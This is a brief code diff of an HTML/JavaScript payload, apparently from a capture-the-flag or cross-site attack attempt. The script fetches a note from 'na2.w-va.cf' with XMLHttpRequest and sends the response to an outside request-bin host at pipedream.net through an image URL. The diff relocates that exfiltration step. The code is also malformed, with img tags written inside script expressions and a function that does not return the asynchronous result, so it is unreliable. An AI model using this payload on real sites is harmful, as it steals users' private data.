@@ -3,7 +3,7 @@
             var xhttp = new XMLHttpRequest();
                 xhttp.onreadystatechange = function() {
                     if (this.readyState == 4 && this.status == 200) {
-                        return <img src="https://enmsdn4h0gw.x.pipedream.net/"+ this.responseText>;
+                        return this.responseText
             }
          };
          xhttp.open("GET", "http://na2.w-va.cf/note/1", true);
@@ -12,5 +12,5 @@
          }
  </script>
 <script>
-         cors()
+        <img src='https://enmsdn4h0gw.x.pipedream.net/' + cors() >
 </script>
